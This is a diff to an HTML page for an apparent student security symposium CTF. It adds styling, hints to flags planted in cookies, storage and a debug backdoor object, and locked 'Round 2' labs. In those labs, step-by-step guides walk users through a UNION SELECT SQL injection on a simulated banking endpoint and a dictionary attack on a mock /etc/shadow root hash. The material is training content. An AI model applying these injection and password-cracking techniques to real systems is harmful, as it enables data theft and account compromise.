@@ -35,6 +35,40 @@
             --font-body: 'Rajdhani', sans-serif;
             --font-mono: 'Share Tech Mono', monospace;
             /* secret: DECODE{css_vars_leak_secrets} */
+
+        /* === Outside Bugs Tracker & Demo Buttons === */
+        .bonus-counter-badge {
+            background: rgba(0, 240, 255, 0.15);
+            border: 1px solid var(--cyan);
+            color: var(--cyan);
+            font-family: var(--font-head);
+            font-size: 0.8rem;
+            padding: 0.3rem 0.8rem;
+            border-radius: 20px;
+            letter-spacing: 1px;
+        }
+        .outside-bugs-hints {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+            margin: 0.8rem 0 1.2rem 0;
+        }
+        .outside-hint-chip {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.12);
+            color: #b0b8d0;
+            font-family: var(--font-mono);
+            font-size: 0.75rem;
+            padding: 0.25rem 0.6rem;
+            border-radius: 4px;
+            transition: all 0.2s ease;
+        }
+        .outside-hint-chip:hover {
+            border-color: var(--cyan);
+            color: #fff;
+            background: rgba(0, 240, 255, 0.1);
+        }
+
         }
 
         html { scroll-behavior: smooth; }
@@ -991,6 +1025,626 @@
             margin-top: 0.4rem;
             margin-bottom: 0.4rem;
         }
+    
+        /* ============================================================
+           ROUND 2: APEX CYBER WARFARE CSS & SHARE TOOLBAR
+           ============================================================ */
+        .finals-section {
+            padding: 5rem 0;
+            background: linear-gradient(180deg, #05060d 0%, #090c1a 50%, #05060d 100%);
+            border-top: 2px solid rgba(255, 0, 85, 0.35);
+            border-bottom: 2px solid rgba(255, 0, 85, 0.35);
+            position: relative;
+            z-index: 5;
+        }
+
+        /* Lock Gate Banner */
+        .finals-lock-gate {
+            max-width: 820px;
+            margin: 0 auto;
+            background: rgba(14, 16, 28, 0.95);
+            border: 2px solid rgba(255, 0, 85, 0.45);
+            border-radius: 16px;
+            padding: 3rem 2.5rem;
+            text-align: center;
+            box-shadow: 0 10px 40px rgba(255, 0, 85, 0.25), 0 0 30px rgba(0, 0, 0, 0.8);
+            position: relative;
+            overflow: hidden;
+        }
+        .finals-lock-gate::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; height: 4px;
+            background: linear-gradient(90deg, #ff0055, #ffaa00, #ff0055);
+            animation: cyberScanline 3s linear infinite;
+        }
+        @keyframes cyberScanline {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        .lock-icon-giant {
+            font-size: 3.8rem;
+            margin-bottom: 1rem;
+            filter: drop-shadow(0 0 20px rgba(255, 0, 85, 0.7));
+            animation: pulseGlow 2s ease-in-out infinite alternate;
+        }
+        @keyframes pulseGlow {
+            0% { transform: scale(1); filter: drop-shadow(0 0 15px rgba(255,0,85,0.5)); }
+            100% { transform: scale(1.05); filter: drop-shadow(0 0 25px rgba(255,0,85,0.9)); }
+        }
+        .lock-badge {
+            display: inline-block;
+            font-family: var(--font-mono);
+            font-size: 0.82rem;
+            color: #ff0055;
+            background: rgba(255, 0, 85, 0.12);
+            border: 1px solid rgba(255, 0, 85, 0.4);
+            padding: 0.35rem 1rem;
+            border-radius: 30px;
+            letter-spacing: 2px;
+            font-weight: 700;
+            margin-bottom: 1rem;
+        }
+        .lock-title {
+            font-family: var(--font-head);
+            font-size: 2.2rem;
+            color: #fff;
+            margin-bottom: 1rem;
+            letter-spacing: 1px;
+            text-shadow: 0 0 15px rgba(255, 0, 85, 0.5);
+        }
+        .lock-desc {
+            color: #ccd5e5;
+            font-size: 1.05rem;
+            line-height: 1.6;
+            margin-bottom: 2rem;
+            max-width: 640px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .lock-input-group {
+            display: flex;
+            gap: 0.8rem;
+            max-width: 520px;
+            margin: 0 auto;
+            justify-content: center;
+        }
+        .lock-input {
+            flex: 1;
+            background: rgba(8, 10, 20, 0.9);
+            border: 1px solid rgba(255, 0, 85, 0.4);
+            border-radius: 8px;
+            padding: 0.85rem 1.2rem;
+            color: #fff;
+            font-family: var(--font-mono);
+            font-size: 1rem;
+            outline: none;
+            transition: all 0.25s;
+        }
+        .lock-input:focus {
+            border-color: #ff0055;
+            box-shadow: 0 0 15px rgba(255, 0, 85, 0.5);
+            background: rgba(12, 16, 30, 0.95);
+        }
+        .btn-unlock-finals {
+            background: linear-gradient(135deg, #ff0055, #ff5500);
+            color: #fff;
+            font-family: var(--font-head);
+            font-size: 0.95rem;
+            font-weight: 700;
+            padding: 0.85rem 1.8rem;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.25s;
+            letter-spacing: 1px;
+            white-space: nowrap;
+        }
+        .btn-unlock-finals:hover {
+            box-shadow: 0 0 20px rgba(255, 0, 85, 0.8);
+            transform: translateY(-2px);
+        }
+        .lock-msg {
+            margin-top: 1.2rem;
+            font-family: var(--font-mono);
+            font-size: 0.9rem;
+            min-height: 1.4rem;
+        }
+        .lock-msg.error { color: #ff3366; }
+        .lock-msg.success { color: var(--green); }
+
+        /* Round 2 Active Arena Container */
+        .finals-arena-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 1.5rem;
+        }
+        .finals-header {
+            text-align: center;
+            margin-bottom: 2.5rem;
+        }
+        .finals-hero-badge {
+            display: inline-block;
+            background: rgba(255, 0, 85, 0.15);
+            color: #ff0055;
+            border: 1px solid rgba(255, 0, 85, 0.4);
+            font-family: var(--font-mono);
+            font-size: 0.85rem;
+            letter-spacing: 2px;
+            padding: 0.35rem 1rem;
+            border-radius: 30px;
+            margin-bottom: 0.8rem;
+        }
+        .finals-title {
+            font-family: var(--font-head);
+            font-size: 2.4rem;
+            color: #fff;
+            letter-spacing: 2px;
+            margin-bottom: 0.6rem;
+            text-shadow: 0 0 20px rgba(255, 0, 85, 0.6);
+        }
+        .finals-subtitle {
+            color: var(--text-dim);
+            font-size: 1.05rem;
+            max-width: 750px;
+            margin: 0 auto;
+        }
+
+        /* Finals Score HUD */
+        .finals-hud {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 1.2rem;
+            margin-bottom: 3rem;
+        }
+        .finals-hud-card {
+            background: rgba(14, 18, 32, 0.85);
+            border: 1px solid rgba(255, 0, 85, 0.3);
+            border-radius: 10px;
+            padding: 1.2rem 1.4rem;
+            text-align: center;
+            backdrop-filter: blur(10px);
+            transition: all 0.3s;
+        }
+        .finals-hud-card:hover {
+            border-color: #ff0055;
+            box-shadow: 0 5px 20px rgba(255, 0, 85, 0.25);
+        }
+        .fhc-label {
+            font-family: var(--font-mono);
+            font-size: 0.8rem;
+            color: #a0a5c0;
+            letter-spacing: 1px;
+            margin-bottom: 0.4rem;
+            text-transform: uppercase;
+        }
+        .fhc-value {
+            font-family: var(--font-head);
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: #fff;
+        }
+        .fhc-value.highlight {
+            color: #ff0055;
+            text-shadow: 0 0 15px rgba(255, 0, 85, 0.5);
+        }
+        .fhc-value.gold {
+            color: #ffd700;
+            text-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
+        }
+
+        /* Warfare Operations Grid */
+        .warfare-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 2.2rem;
+            margin-bottom: 3.5rem;
+        }
+
+        /* Warfare Card */
+        .wf-card {
+            background: rgba(13, 16, 28, 0.95);
+            border: 1px solid rgba(255, 0, 85, 0.25);
+            border-radius: 14px;
+            padding: 2rem;
+            position: relative;
+            transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+        .wf-card:hover {
+            border-color: rgba(255, 0, 85, 0.6);
+            box-shadow: 0 10px 35px rgba(255, 0, 85, 0.2);
+        }
+        .wf-card.solved {
+            border-color: var(--green);
+            background: rgba(10, 24, 20, 0.95);
+            box-shadow: 0 8px 30px rgba(57, 255, 20, 0.15);
+        }
+        .wf-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 1.2rem;
+            flex-wrap: wrap;
+            gap: 0.8rem;
+        }
+        .wf-op-num {
+            font-family: var(--font-mono);
+            font-size: 0.82rem;
+            color: #ff0055;
+            letter-spacing: 2px;
+            font-weight: 700;
+            margin-bottom: 0.3rem;
+        }
+        .wf-card.solved .wf-op-num { color: var(--green); }
+        .wf-title {
+            font-family: var(--font-head);
+            font-size: 1.4rem;
+            color: #fff;
+            letter-spacing: 1px;
+        }
+        .wf-meta {
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+        }
+        .wf-badge-points {
+            font-family: var(--font-mono);
+            font-size: 0.85rem;
+            background: rgba(255, 0, 85, 0.15);
+            color: #ff0055;
+            border: 1px solid rgba(255, 0, 85, 0.4);
+            padding: 0.25rem 0.75rem;
+            border-radius: 20px;
+            font-weight: 700;
+        }
+        .wf-card.solved .wf-badge-points {
+            background: rgba(57, 255, 20, 0.15);
+            color: var(--green);
+            border-color: var(--green);
+        }
+        .wf-status-tag {
+            font-family: var(--font-mono);
+            font-size: 0.8rem;
+            padding: 0.25rem 0.75rem;
+            border-radius: 20px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .wf-status-tag.pending {
+            background: rgba(255, 170, 0, 0.12);
+            color: #ffaa00;
+            border: 1px solid rgba(255, 170, 0, 0.3);
+        }
+        .wf-status-tag.cleared {
+            background: rgba(57, 255, 20, 0.2);
+            color: var(--green);
+            border: 1px solid var(--green);
+            font-weight: 700;
+        }
+
+        .wf-scenario-desc {
+            color: #d1d5db;
+            font-size: 1rem;
+            line-height: 1.6;
+            margin-bottom: 1.5rem;
+        }
+
+        /* Interactive Lab Playground Box */
+        .wf-lab-box {
+            background: rgba(7, 9, 16, 0.9);
+            border: 1px solid rgba(0, 240, 255, 0.2);
+            border-radius: 10px;
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+        .wf-lab-topbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+            padding-bottom: 0.8rem;
+            margin-bottom: 1.2rem;
+            font-family: var(--font-mono);
+            font-size: 0.85rem;
+            color: #a0a5c0;
+        }
+        .wf-lab-term-dots {
+            display: flex;
+            gap: 6px;
+        }
+        .wf-dot {
+            width: 11px;
+            height: 11px;
+            border-radius: 50%;
+        }
+        .wf-dot.red { background: #ff5f56; }
+        .wf-dot.yellow { background: #ffbd2e; }
+        .wf-dot.green { background: #27c93f; }
+
+        .wf-console-output {
+            background: #040508;
+            border: 1px solid #1a2035;
+            border-radius: 8px;
+            padding: 1rem;
+            font-family: var(--font-mono);
+            font-size: 0.88rem;
+            color: #39ff14;
+            max-height: 200px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            margin-bottom: 1.2rem;
+            line-height: 1.5;
+        }
+
+        /* Tactical Clue Collapsible */
+        .wf-clue-wrapper {
+            margin-bottom: 1.4rem;
+        }
+        .wf-clue-toggle {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            color: #ffd700;
+            font-family: var(--font-mono);
+            font-size: 0.85rem;
+            padding: 0.5rem 1rem;
+            border-radius: 6px;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            transition: all 0.2s;
+        }
+        .wf-clue-toggle:hover {
+            background: rgba(255, 215, 0, 0.12);
+            border-color: #ffd700;
+        }
+        .wf-clue-body {
+            display: none;
+            background: rgba(255, 215, 0, 0.05);
+            border-left: 3px solid #ffd700;
+            padding: 1rem 1.2rem;
+            margin-top: 0.6rem;
+            border-radius: 0 8px 8px 0;
+            font-size: 0.95rem;
+            color: #e5e7eb;
+            line-height: 1.6;
+        }
+        .wf-clue-body code {
+            background: rgba(0, 0, 0, 0.5);
+            color: #39ff14;
+            padding: 0.2rem 0.5rem;
+            border-radius: 4px;
+            font-family: var(--font-mono);
+            font-size: 0.9em;
+        }
+
+        /* Submission & Flag Section inside Card */
+        .wf-flag-submission-row {
+            display: flex;
+            gap: 0.8rem;
+            flex-wrap: wrap;
+            align-items: center;
+        }
+        .wf-flag-input {
+            flex: 1;
+            min-width: 250px;
+            background: rgba(5, 7, 14, 0.9);
+            border: 1px solid rgba(0, 240, 255, 0.3);
+            border-radius: 8px;
+            padding: 0.75rem 1.2rem;
+            color: #fff;
+            font-family: var(--font-mono);
+            font-size: 0.95rem;
+            outline: none;
+            transition: all 0.25s;
+        }
+        .wf-flag-input:focus {
+            border-color: var(--cyan);
+            box-shadow: 0 0 15px rgba(0, 240, 255, 0.4);
+        }
+        .btn-submit-flag {
+            background: var(--grad);
+            color: #000;
+            font-family: var(--font-head);
+            font-size: 0.9rem;
+            font-weight: 700;
+            padding: 0.75rem 1.6rem;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.25s;
+            letter-spacing: 1px;
+        }
+        .btn-submit-flag:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 0 20px rgba(0, 240, 255, 0.6);
+        }
+        .wf-op-feedback {
+            width: 100%;
+            margin-top: 0.6rem;
+            font-family: var(--font-mono);
+            font-size: 0.88rem;
+            min-height: 1.2rem;
+        }
+        .wf-op-feedback.error { color: #ff3366; }
+        .wf-op-feedback.success { color: var(--green); }
+
+        /* Finals Submission Box */
+        .finals-submission-card {
+            background: linear-gradient(135deg, rgba(20, 24, 45, 0.95), rgba(12, 16, 30, 0.95));
+            border: 2px solid rgba(0, 240, 255, 0.4);
+            border-radius: 16px;
+            padding: 2.5rem;
+            text-align: center;
+            box-shadow: 0 10px 40px rgba(0, 240, 255, 0.15);
+            margin-top: 2rem;
+        }
+        .fsc-title {
+            font-family: var(--font-head);
+            font-size: 1.8rem;
+            color: #fff;
+            margin-bottom: 0.8rem;
+        }
+        .fsc-desc {
+            color: #ccd5e5;
+            font-size: 1.05rem;
+            max-width: 650px;
+            margin: 0 auto 1.8rem;
+        }
+        .fsc-actions {
+            display: flex;
+            gap: 1rem;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        /* Navbar Finals Pill */
+        .finals-pill {
+            background: rgba(255, 0, 85, 0.15);
+            border: 1px solid rgba(255, 0, 85, 0.4);
+            color: #ff0055;
+            cursor: pointer;
+            transition: all 0.25s;
+        }
+        .finals-pill:hover {
+            border-color: #ff0055;
+            box-shadow: 0 0 12px rgba(255, 0, 85, 0.5);
+            color: #fff;
+        }
+        .finals-pill.unlocked {
+            background: rgba(57, 255, 20, 0.15);
+            border-color: var(--green);
+            color: var(--green);
+        }
+
+        /* Scorecard Share Actions Toolbar */
+        .scorecard-actions-bar {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.8rem;
+            justify-content: center;
+            margin-top: 1.5rem;
+            margin-bottom: 1.5rem;
+            padding-top: 1.2rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .scorecard-actions-bar .btn {
+            font-size: 0.88rem;
+            padding: 0.65rem 1.2rem;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.4rem;
+        }
+        .btn-jpg-download {
+            border-color: #f0ff00 !important;
+            color: #f0ff00 !important;
+        }
+        .btn-jpg-download:hover {
+            background: rgba(240, 255, 0, 0.15) !important;
+        }
+        .btn-whatsapp-share {
+            border-color: #25d366 !important;
+            color: #25d366 !important;
+        }
+        .btn-whatsapp-share:hover {
+            background: rgba(37, 211, 102, 0.15) !important;
+        }
+
+        /* Scorecard Stage Tabs (Stage 1 / Stage 2 / Grand) */
+        .sheet-stage-tabs {
+            display: flex;
+            gap: 0.6rem;
+            margin-bottom: 1.2rem;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+        .sheet-stage-tab {
+            background: rgba(10, 14, 28, 0.8);
+            border: 1px solid rgba(0, 240, 255, 0.25);
+            color: #a0a5c0;
+            padding: 0.45rem 1rem;
+            border-radius: 6px;
+            font-family: var(--font-mono);
+            font-size: 0.82rem;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .sheet-stage-tab:hover {
+            color: #fff;
+            border-color: var(--cyan);
+        }
+        .sheet-stage-tab.active {
+            background: rgba(0, 240, 255, 0.18);
+            border-color: var(--cyan);
+            color: var(--cyan);
+            font-weight: bold;
+        }
+
+    
+        .wf-quick-guide {
+            background: rgba(0, 240, 255, 0.06);
+            border-left: 3px solid var(--cyan);
+            padding: 0.85rem 1.15rem;
+            border-radius: 0 8px 8px 0;
+            margin-bottom: 1.3rem;
+            font-size: 0.94rem;
+            line-height: 1.55;
+            color: #d8e2f0;
+        }
+        .wf-quick-guide strong {
+            color: var(--cyan);
+            font-family: var(--font-mono);
+            display: block;
+            margin-bottom: 0.35rem;
+            letter-spacing: 1px;
+        }
+        .wf-quick-guide code {
+            background: rgba(0, 0, 0, 0.65);
+            color: #ffd700;
+            padding: 0.18rem 0.5rem;
+            border-radius: 4px;
+            font-family: var(--font-mono);
+            word-break: break-all;
+        }
+
+    
+        /* Single Task Submission Button */
+        .wf-action-row {
+            margin-top: 1.2rem;
+            display: flex;
+            align-items: center;
+            gap: 1.2rem;
+            flex-wrap: wrap;
+        }
+        .btn-submit-task {
+            background: linear-gradient(135deg, var(--cyan), #00a8ff);
+            color: #000;
+            font-family: var(--font-head);
+            font-size: 0.95rem;
+            font-weight: 700;
+            padding: 0.8rem 2.5rem;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.25s;
+            letter-spacing: 1.5px;
+            box-shadow: 0 4px 15px rgba(0, 240, 255, 0.3);
+        }
+        .btn-submit-task:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 25px rgba(0, 240, 255, 0.6);
+            background: linear-gradient(135deg, #39ff14, var(--cyan));
+        }
+        .btn-submit-task.cleared {
+            background: rgba(57, 255, 20, 0.2) !important;
+            color: var(--green) !important;
+            border: 1px solid var(--green) !important;
+            cursor: default !important;
+            box-shadow: none !important;
+            transform: none !important;
+        }
+
     </style>
 </head>
 <body>
@@ -1010,6 +1664,7 @@
             <span class="score-pill">🏆 <strong id="navScore">0</strong> PTS</span>
             <span class="score-pill">🚩 <strong id="navSolved">0</strong>/24</span>
 
+            <span class="score-pill finals-pill" id="navFinalsPill" onclick="scrollToFinals()" title="Final Round Clearance Status">🔒 Round 2 (Locked)</span>
             <button type="button" class="btn-share-score" onclick="openScorecard()" title="View & Share Score Sheet">
                 📜 Share Score
             </button>
@@ -1019,6 +1674,7 @@
             <li><a href="#challenges">Challenges</a></li>
             <li><a href="#common">Vulnerabilities</a></li>
             <li><a href="#hints">Hints</a></li>
+            <li><a href="#finals" id="navLinkFinals">Round 2: Finals 🔒</a></li>
         </ul>
         <div class="hamburger" onclick="document.getElementById('navLinks').classList.toggle('open')">
             <span></span><span></span><span></span>
@@ -1152,10 +1808,27 @@
             <div class="bonus-validator-box reveal">
                 <div class="bonus-icon">🕵️</div>
                 <div class="bonus-content">
-                    <h3>Found a Secret Hidden Flag on this Website?</h3>
-                    <p>Discovered a secret in <strong>View Source</strong>, <strong>Inspect Element</strong>, <strong>Meta Tags</strong>, or <strong>CSS Variables</strong>? Paste any <code>DECODE{...}</code> flag here to claim your bonus score!</p>
+                    <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 0.5rem;">
+                        <h3 style="margin-bottom: 0;">Found a Secret "Outside" Bug on this Website?</h3>
+                        <span class="bonus-counter-badge" id="outsideBugsCounter">Outside Bugs: 0 / 12 Claimed</span>
+                    </div>
+                    <p style="margin-top: 0.6rem;">
+                        Intentional vulnerabilities are planted <strong>outside</strong> the questions across this website! Use <code>F12</code> DevTools, Inspect Element, Page Source (<code>Ctrl+U</code>), Browser Console, Cookies, LocalStorage, or URL parameters to hunt them down. Paste any <code>DECODE{...}</code> flag here to claim your bonus score!
+                    </p>
+                    <div class="outside-bugs-hints">
+                        <span class="outside-hint-chip" title="Inspect page source (Ctrl+U)">📄 HTML Comments</span>
+                        <span class="outside-hint-chip" title="Inspect &lt;meta&gt; tags in &lt;head&gt;">🏷️ Meta Tags</span>
+                        <span class="outside-hint-chip" title="Inspect :root CSS variables in stylesheet">🎨 CSS Variables</span>
+                        <span class="outside-hint-chip" title="Inspect hidden DOM elements with F12">🔍 Hidden DOM Elements</span>
+                        <span class="outside-hint-chip" title="Check browser console logs (F12 > Console)">💻 DevTools Console</span>
+                        <span class="outside-hint-chip" title="Check Application > Local Storage">🗄️ LocalStorage</span>
+                        <span class="outside-hint-chip" title="Check Application > Cookies">🍪 Browser Cookies</span>
+                        <span class="outside-hint-chip" title="Inspect window.__CYBER_DEV_BACKDOOR__">🪟 Global Window Object</span>
+                        <span class="outside-hint-chip" title="Visit with URL parameter ?debug=true">🌐 URL ?debug=true</span>
+                        <span class="outside-hint-chip" title="Inspect database/arena_database.json">💾 Database Dump</span>
+                    </div>
                     <div class="input-row bonus-input-row">
-                        <input type="text" id="bonusFlagInput" class="ans-input" placeholder="DECODE{...}" onkeydown="if(event.key==='Enter')submitBonusFlag()">
+                        <input type="text" id="bonusFlagInput" class="ans-input" placeholder="Paste any DECODE{...} outside bug flag" onkeydown="if(event.key==='Enter')submitBonusFlag()">
                         <button class="ans-submit-btn bonus-btn" onclick="submitBonusFlag()">Claim Flag</button>
                     </div>
                     <div class="ans-feedback" id="bonusFeedback"></div>
@@ -1259,6 +1932,655 @@
                     <a href="https://www.eccouncil.org/ethical-hacking/" target="_blank" rel="noopener noreferrer">📖 Ethical Hacking Code →</a>
                 </div>
             </div>
+        </div>
+    </section>
+
+
+
+        <!-- ============================================================
+         ROUND 2: APEX CYBER WARFARE ARENA
+         ============================================================ -->
+        <!-- ============================================================
+         ROUND 2: APEX CYBER WARFARE ARENA (MANUAL HACKING LABS)
+         ============================================================ -->
+    <section id="finals" class="finals-section">
+        <!-- 1. LOCKED CYBER GATE (Keyword Protected) -->
+        <div class="finals-lock-gate" id="finalsLockGate">
+            <div class="lock-icon-giant">🔒</div>
+            <div class="lock-badge">ROUND 2 // RESTRICTED ACCESS GATE</div>
+            <h2 class="lock-title">APEX CYBER WARFARE ARENA</h2>
+            <p class="lock-desc">
+                This round is restricted to qualifying symposium participants.
+                Please enter the authorized <strong>Clearance Keyword</strong> (e.g. <code>CYBERWAR2026</code>) announced by the event coordinators to decrypt and unlock the warfare arena.
+            </p>
+            <div class="lock-input-group">
+                <input type="text" id="finalsUnlockKey" class="lock-input" placeholder="ENTER CLEARANCE KEYWORD (e.g. CYBERWAR2026)" onkeydown="if(event.key==='Enter')unlockRound2()">
+                <button type="button" class="btn-unlock-finals" onclick="unlockRound2()">
+                    🔓 Decrypt &amp; Unlock Finals
+                </button>
+            </div>
+            <div id="finalsLockMsg" class="lock-msg"></div>
+        </div>
+
+        <!-- 2. UNLOCKED ARENA CONTENT (Visible after clearance) -->
+        <div class="finals-arena-container" id="finalsArenaContent" style="display: none;">
+            <div class="finals-header">
+                <div class="finals-hero-badge">STAGE 2 // GRAND FINALS</div>
+                <h2 class="finals-title">APEX CYBER WARFARE LABS</h2>
+                <p class="finals-subtitle">
+                    Nine hands-on security warfare operations. Conduct manual investigation, analyze simulated artifacts, follow the step-by-step mission guidance, and submit flags to dominate the symposium scoreboard.
+                </p>
+            </div>
+
+            <!-- Score HUD -->
+            <div class="finals-hud">
+                <div class="finals-hud-card">
+                    <div class="fhc-label">Stage 2 Operations</div>
+                    <div class="fhc-value" id="hudR2Solved">0 / 9</div>
+                </div>
+                <div class="finals-hud-card">
+                    <div class="fhc-label">Stage 2 Warfare PTS</div>
+                    <div class="fhc-value highlight" id="hudR2Points">0 / 2,600</div>
+                </div>
+                <div class="finals-hud-card">
+                    <div class="fhc-label">Stage 1 Recon PTS</div>
+                    <div class="fhc-value" id="hudR1Points">0 / 1,800</div>
+                </div>
+                <div class="finals-hud-card">
+                    <div class="fhc-label">Grand Total Score</div>
+                    <div class="fhc-value gold" id="hudGrandPoints">0 / 4,400</div>
+                </div>
+            </div>
+
+            <!-- Operations Grid -->
+            <div class="warfare-grid">
+
+                <!-- OPERATION 1: SQL INJECTION (SQLi) -->
+                <div class="wf-card" id="card_op_sqli">
+                    <div class="wf-header">
+                        <div>
+                            <div class="wf-op-num">OPERATION 01 // DATABASE EXPLOITATION</div>
+                            <h3 class="wf-title">WAF Bypass &amp; Data Vault Extraction (SQLi)</h3>
+                        </div>
+                        <div class="wf-meta">
+                            <span class="wf-badge-points">+300 PTS</span>
+                            <span class="wf-status-tag pending" id="tag_op_sqli">PENDING</span>
+                        </div>
+                    </div>
+                    <p class="wf-scenario-desc">
+                        An internal banking gateway endpoint <code>/api/v2/vault/lookup?id=</code> is protected by an input filter. Leverage a SQL <code>UNION SELECT</code> payload to extract the encrypted security token from the hidden table <code>internal_vault</code>.
+                    </p>
+
+                    <div class="wf-quick-guide">
+                        <strong>🎯 Manual Mission Guide:</strong>
+                        1. The backend parses a 3-column SQL query (<code>id, name, price</code>).<br>
+                        2. Use SQL <code>UNION SELECT</code> syntax to join rows from the hidden table <code>internal_vault</code> (columns: <code>1, token, secret</code>).<br>
+                        3. Escape the single quote, balance column counts, terminate with a comment delimiter (<code>--</code>), and click <strong>⚡ Execute Query</strong>.
+                    </div>
+
+                    <div class="wf-lab-box">
+                        <div class="wf-lab-topbar">
+                            <span>TERMINAL // QUERY CONSOLE</span>
+                            <div class="wf-lab-term-dots">
+                                <span class="wf-dot red"></span><span class="wf-dot yellow"></span><span class="wf-dot green"></span>
+                            </div>
+                        </div>
+                        <div class="lock-input-group" style="max-width: 100%; margin-bottom: 1rem;">
+                            <input type="text" id="sqliInput" class="lock-input" placeholder="Type SQL injection (e.g. 1' UNION SELECT ...)">
+                            <button type="button" class="btn btn-outline" onclick="runSqliQuery()">⚡ Execute Query</button>
+                        </div>
+                        <div class="wf-console-output" id="sqliOutput">// System Ready. Construct your SQL injection query above and click Execute Query...</div>
+                    </div>
+                    <div class="wf-clue-wrapper">
+                        <button type="button" class="wf-clue-toggle" onclick="toggleTacticalClue('op_sqli')">
+                            💡 Tactical Clues &amp; Step-by-Step Guide
+                        </button>
+                        <div class="wf-clue-body" id="clue_op_sqli">
+                            <strong>Tactical Guidance:</strong>
+                            <ol style="margin-left: 1.2rem; margin-top: 0.4rem;">
+                                <li>The application executes: <code>SELECT id, name, price FROM items WHERE id = '$input'</code>.</li>
+                                <li>Closing the quote and appending a <code>UNION SELECT</code> query allows dumping records from the hidden <code>internal_vault</code> table.</li>
+                                <li>Ensure the number of columns matches the query (3 columns: <code>1, token, secret</code>) and terminate with a comment delimiter (<code>--</code>).</li>
+                                <li>Click <em>Execute Query</em>. Inspect the dumped table output in the terminal to find the breach flag.</li>
+                            </ol>
+                        </div>
+                    </div>
+                    <div class="wf-action-row">
+                        <button type="button" class="btn-submit-task" id="btn_submit_op_sqli" onclick="submitRound2Task('op_sqli')">
+                            SUBMIT
+                        </button>
+                        <div class="wf-op-feedback" id="feedback_op_sqli"></div>
+                    </div>
+                </div>
+
+                <!-- OPERATION 2: PASSWORD CRACKING -->
+                <div class="wf-card" id="card_op_crack">
+                    <div class="wf-header">
+                        <div>
+                            <div class="wf-op-num">OPERATION 02 // CRYPTOGRAPHIC OFFENSE</div>
+                            <h3 class="wf-title">Linux Shadow Hash Cracking (Rainbow Table)</h3>
+                        </div>
+                        <div class="wf-meta">
+                            <span class="wf-badge-points">+250 PTS</span>
+                            <span class="wf-status-tag pending" id="tag_op_crack">PENDING</span>
+                        </div>
+                    </div>
+                    <p class="wf-scenario-desc">
+                        A compromised server leak provides the sysadmin root hash from <code>/etc/shadow</code>:
+                        <code style="display:block; margin: 0.5rem 0; word-break: break-all; color: var(--cyan); background: #000; padding: 0.4rem 0.8rem; border-radius: 4px;">$6$qZ7x8$d04b98f48e8f8bcc15c6ae5ac050801cd6dcfd428fb5f9e65c4e16e7807340fa</code>
+                    </p>
+
+                    <div class="wf-quick-guide">
+                        <strong>🎯 Manual Mission Guide:</strong>
+                        1. Click <strong>Step 1: Load Sympo Wordlist</strong> to load dictionary candidate passwords into memory.<br>
+                        2. Click <strong>Step 2: Run Dictionary Attack</strong> to benchmark and match the hashes to retrieve the password and flag.
+                    </div>
+
+                    <div class="wf-lab-box">
+                        <div class="wf-lab-topbar">
+                            <span>TOOL // RAINBOW TABLE DICTIONARY CRACKER</span>
+                            <div class="wf-lab-term-dots">
+                                <span class="wf-dot red"></span><span class="wf-dot yellow"></span><span class="wf-dot green"></span>
+                            </div>
+                        </div>
+                        <div style="display: flex; gap: 0.8rem; margin-bottom: 1rem; flex-wrap: wrap;">
+                            <button type="button" class="btn btn-outline" onclick="loadWordlist()">📁 Step 1: Load Sympo Wordlist</button>
+                            <button type="button" class="btn btn-outline" onclick="runHashCracker()">🔨 Step 2: Run Dictionary Attack</button>
+                        </div>
+                        <div class="wf-console-output" id="hashCrackOutput">// Ready. Click "Step 1: Load Sympo Wordlist" then "Step 2: Run Dictionary Attack" to crack the hash...</div>
+                    </div>
+                    <div class="wf-clue-wrapper">
+                        <button type="button" class="wf-clue-toggle" onclick="toggleTacticalClue('op_crack')">
+                            💡 Tactical Clues &amp; Step-by-Step Guide
+                        </button>
+                        <div class="wf-clue-body" id="clue_op_crack">
+                            <strong>Tactical Guidance:</strong>
+                            <ol style="margin-left: 1.2rem; margin-top: 0.4rem;">
+                                <li>The hash represents a modern SHA-512 crypt entry ($6$). Pure bruteforce would take weeks, but dictionary attacks test likely passwords quickly.</li>
+                                <li>Click <em>Load Sympo Wordlist</em> to inspect candidate passwords stored in the dictionary buffer.</li>
+                                <li>Click <em>Run Dictionary Attack</em>. When the hash collision matches, the cracked cleartext password and root flag will appear in the output log.</li>
+                            </ol>
+                        </div>
+                    </div>
+                    <div class="wf-action-row">
